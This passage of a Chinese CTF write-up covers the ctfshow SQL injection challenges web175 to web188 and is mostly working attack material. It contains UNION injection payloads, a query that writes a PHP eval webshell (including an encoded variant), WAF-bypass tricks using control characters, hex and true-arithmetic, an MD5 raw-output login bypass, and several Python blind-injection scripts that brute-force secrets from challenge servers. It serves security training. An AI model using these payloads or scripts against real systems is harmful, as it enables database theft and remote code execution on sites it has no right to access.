</code></pre><p>过滤ASCII0-127的字符</p><p>1.将flag查询结果传入1.txt，访问url&#x2F;1.txt文件得flag</p><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre><p>2.将一句话木马传入1.php，使用蚁剑链接后，访问数据库，查询flag</p><p>查询语句：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><p>burp-decoder—&gt;base64加密一句话木马，用url加密表示</p><p>payload:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre><h4 id="web176-大小写绕过"><a href="#web176-大小写绕过" class="headerlink" title="web176(大小写绕过)"></a>web176(大小写绕过)</h4><p>ban了select，使用大小写绕过</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre><h4 id="web177-绕过空格"><a href="#web177-绕过空格" class="headerlink" title="web177(&#x2F;**&#x2F;绕过空格)"></a>web177(&#x2F;**&#x2F;绕过空格)</h4><p>把空格给过滤掉了，就相当于把注释符– 给过滤掉了，我们可以用&#x2F;**&#x2F;或者是%0a（回车）来绕过空格的过滤，%23（#）来绕过注释符的过滤</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre><h4 id="web178-090a0b0c0d绕空格"><a href="#web178-090a0b0c0d绕空格" class="headerlink" title="web178(%090a0b0c0d绕空格*)"></a>web178(%090a0b0c0d绕空格*)</h4><p>因为已经过滤了<code>*</code>，那么就需要用其它字符来绕过空格，可以选择</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre><p>万能密码</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231’or&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>把<code>%09 %0a %0b %0d</code>过滤了，可以用<code>%0c</code></p><p>把上面的那个全换成<code>%0c</code></p><h4 id="web180-闭合绕过-23"><a href="#web180-闭合绕过-23" class="headerlink" title="web180(闭合绕过%23)"></a>web180(闭合绕过%23)</h4><p>过滤了空格和%23 ，空格可用<code>%0c</code>，%23用<code>or&#39;1&#39;=&#39;&#39;</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>同上</p><h4 id="web182-like模糊匹配"><a href="#web182-like模糊匹配" class="headerlink" title="web182(like模糊匹配)"></a>web182(like模糊匹配)</h4><p>增加了flag过滤。like可以模糊匹配，或者同上万能密码</p><p><code>%0c</code>在本题依旧可用。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre><p>like可以用两个通配符（不区分大小写）：</p><table><thead><tr><th>字符</th><th>说明</th></tr></thead><tbody><tr><td><code>%</code></td><td>匹配任何数目的字符，甚至包括零字符</td></tr><tr><td><code>_</code></td><td>只能匹配一种字符</td></tr></tbody></table><h4 id="web183-布尔盲注"><a href="#web183-布尔盲注" class="headerlink" title="web183(布尔盲注)"></a>web183(布尔盲注)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>      </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>查询结果</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//返回用户表的记录总数</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      </code></pre><p>waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p><p>select不能用，就只能选择布尔盲注或者时间盲注了。</p><p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p><p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count &#x3D; 1;，可以用布尔盲注。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre><p>Payload：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># 有并发数量限制的题目，就睡一段时间</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>where</code>、<code>&#39; &quot;</code>、反引号被过滤了，但是本题没有过滤空格。</p><p><strong>方法一：（用right join绕过过滤）</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre><p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。</p><p>[right join菜鸟教程](<a href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN 关键字 | 菜鸟教程 (runoob.com)</a>)</p><p>这里是分别将ctfshow_uer重命名为a和b，接着在b中进行筛选，然后用<code>right join</code>将b中筛选出来的值与a表的值进行匹配。</p><p>这里用<code>$user_count = 43;</code>作为筛选条件。</p><p>Y4tacker师傅的代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><p><strong>方法二：（where用having代替，’ “可以用 ()+Hex代替）</strong></p><p>查看官方文档，看看select语法。发现having和where可以替换，但是having语句有使用条件。</p><blockquote><p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p></blockquote><p><a href="https://www.runoob.com/sql/sql-having.html">SQL HAVING 子句</a></p><p><img src="web184.png" loading="lazy"></p><p><strong>十六进制</strong>：可以前面加x，后面用引号包裹或者0x；也可以和算数运算结合表示数字。</p><p><img src="web184_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#有并发数量限制的，就睡一段时间</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web185-true绕过数字"><a href="#web185-true绕过数字" class="headerlink" title="web185(true绕过数字)"></a>web185(true绕过数字)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>数字被ban了</p><p><img src="web185.png" loading="lazy"></p><p><strong>方法一</strong>：可以使用concat来拼接字符串</p><p><img src="web185_2.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        tip <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tip <span class="token operator">=</span> <span class="token number">1</span>            temp <span class="token operator">+=</span> <span class="token string">"char("</span>            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token string">"false"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp_d <span class="token operator">=</span> <span class="token string">"("</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>            temp <span class="token operator">+=</span> temp_d        temp <span class="token operator">+=</span> <span class="token string">","</span>    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> temp<span class="token comment"># print(formatString("0x63746673686f777b"))</span>url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span><span class="token comment"># dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span>dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment"># print(data)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><p><strong>方法二</strong>：继续使用right join</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>增加了尖括号，<code>^</code>、<code>%</code>的过滤。<br>上题的payload可用。</p><h4 id="web187-ffifdyop绕过md5"><a href="#web187-ffifdyop绕过md5" class="headerlink" title="web187(ffifdyop绕过md5)"></a>web187(ffifdyop绕过md5)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只有admin可以获得flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名不存在'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><p><img src="web187.png" loading="lazy"></p><p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p><h4 id="web188-弱比较"><a href="#web188-弱比较" class="headerlink" title="web188(&#x3D;&#x3D;弱比较)"></a>web188(&#x3D;&#x3D;弱比较)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span 